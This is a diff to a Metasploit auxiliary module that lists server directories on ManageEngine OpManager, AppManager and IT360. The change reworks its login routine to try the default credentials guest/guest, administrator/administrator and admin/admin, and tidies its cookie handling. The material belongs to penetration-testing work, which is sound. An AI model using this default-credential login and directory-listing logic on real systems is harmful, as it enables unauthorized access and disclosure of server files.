@@ -47,22 +47,25 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, "The base path to OpManager, AppManager or IT360", '/']),
         OptString.new('DIRECTORY', [true, 'Path of the directory to list', '/etc/']),
         OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
-        OptString.new('USERNAME', [true, 'The username to login as (IT360 target only)', 'guest']),
-        OptString.new('PASSWORD', [true, 'Password for the specified username (IT360 target only)', 'guest']),
+        OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),
+        OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),
         OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
       ], self.class)
   end
 
 
   def get_cookie
+    cookie = nil
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'])
     })
 
     if res
-      return res.get_cookies
+      cookie = res.get_cookies
     end
+
+    cookie
   end
 
   def detect_it360
@@ -128,9 +131,9 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
       return res.get_cookies
-    else
-      return nil
     end
+
+    nil
   end
 
 
@@ -154,23 +157,36 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
-    if cookie != nil
-      return cookie
-    elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil
-      # we've tried with the default guest password, now let's try with the default admin password
-      cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
-      if cookie != nil
+    if datastore['USERNAME'] && datastore['PASSWORD']
+      print_status("#{peer} - Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
+      cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
+      unless cookie.nil?
         return cookie
-      else
-        # Try one more time with the default admin login for some versions
-        cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
-        if cookie != nil
-          return cookie
-        end
       end
     end
-    return nil
+
+    # Trying with the default guest password
+    print_status("#{peer} - Trying to authenticate as guest/guest...")
+    cookie = authenticate_it360(uri[0], uri[1], 'guest', 'guest')
+    unless cookie.nil?
+      return cookie
+    end
+
+    # we've tried with the default guest password, now let's try with the default admin password
+    print_status("#{peer} - Trying to authenticate as administrator/administrator...")
+    cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
+    unless cookie.nil?
+      return cookie
+    end
+
+    # Try one more time with the default admin login for some versions
+    print_status("#{peer} - Trying to authenticate as admin/admin...")
+    cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
+    unless cookie.nil?
+      return cookie
+    end
+
+    nil
   end
 
   def run
@@ -183,12 +199,13 @@ class Metasploit3 < Msf::Auxiliary
     if detect_it360
       print_status("#{peer} - Detected IT360, attempting to login...")
       cookie = login_it360
-      if cookie == nil
-        print_error("#{peer} - Failed to login to IT360!")
-        return
-      end
     else
       cookie = get_cookie
+    end
+
+    if cookie.nil?
+      print_error("#{peer} - Failed to get application cookies!")
+      return
     end
 
     servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet'
